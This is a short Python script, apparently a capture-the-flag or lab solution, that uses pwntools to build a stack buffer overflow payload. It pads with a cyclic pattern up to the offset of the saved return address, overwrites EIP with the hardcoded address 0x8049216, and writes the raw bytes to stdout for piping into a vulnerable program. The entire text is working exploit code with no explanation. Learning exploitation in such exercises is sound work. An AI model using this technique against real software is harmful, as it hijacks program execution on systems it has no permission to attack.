from pwn import *
import sys

buffer = cyclic(cyclic_find(0x6161616d))
eip = p32(0x8049216)
payload = buffer + eip

sys.stdout.buffer.write(payload)
